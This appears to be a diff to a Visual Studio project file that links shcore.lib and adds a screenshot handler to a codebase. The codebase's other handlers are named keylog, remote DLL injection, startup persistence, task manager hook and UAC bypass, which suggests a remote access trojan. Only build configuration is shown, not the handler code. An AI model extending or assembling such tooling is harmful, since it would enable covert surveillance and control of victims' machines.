@@ -100,6 +100,7 @@
       <SubSystem>Windows</SubSystem>
       <GenerateDebugInformation>true</GenerateDebugInformation>
       <EnableUAC>false</EnableUAC>
+      <AdditionalDependencies>shcore.lib;%(AdditionalDependencies)</AdditionalDependencies>
     </Link>
   </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
@@ -120,6 +121,7 @@
       <OptimizeReferences>true</OptimizeReferences>
       <GenerateDebugInformation>true</GenerateDebugInformation>
       <EnableUAC>false</EnableUAC>
+      <AdditionalDependencies>shcore.lib;%(AdditionalDependencies)</AdditionalDependencies>
     </Link>
   </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
@@ -136,6 +138,7 @@
       <SubSystem>Windows</SubSystem>
       <GenerateDebugInformation>true</GenerateDebugInformation>
       <EnableUAC>false</EnableUAC>
+      <AdditionalDependencies>shcore.lib;%(AdditionalDependencies)</AdditionalDependencies>
     </Link>
   </ItemDefinitionGroup>
   <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
@@ -156,6 +159,7 @@
       <OptimizeReferences>true</OptimizeReferences>
       <GenerateDebugInformation>true</GenerateDebugInformation>
       <EnableUAC>false</EnableUAC>
+      <AdditionalDependencies>shcore.lib;%(AdditionalDependencies)</AdditionalDependencies>
     </Link>
   </ItemDefinitionGroup>
   <ItemGroup>
@@ -166,6 +170,7 @@
     <ClInclude Include="handlers\keylog.h" />
     <ClInclude Include="handlers\process_list.h" />
     <ClInclude Include="handlers\remote_dll_injection.h" />
+    <ClInclude Include="handlers\screenshot.h" />
     <ClInclude Include="handlers\startup.h" />
     <ClInclude Include="handlers\taskmgr_hook.h" />
     <ClInclude Include="handlers\uac_bypass.h" />
@@ -181,6 +186,7 @@
     <ClCompile Include="handlers\keylog_rawinput.cpp" />
     <ClCompile Include="handlers\process_list.cpp" />
     <ClCompile Include="handlers\remote_dll_injection.cpp" />
+    <ClCompile Include="handlers\screenshot.cpp" />
     <ClCompile Include="handlers\startup.cpp" />
     <ClCompile Include="handlers\taskmgr_hook.cpp" />
     <ClCompile Include="handlers\uac_bypass.cpp" />
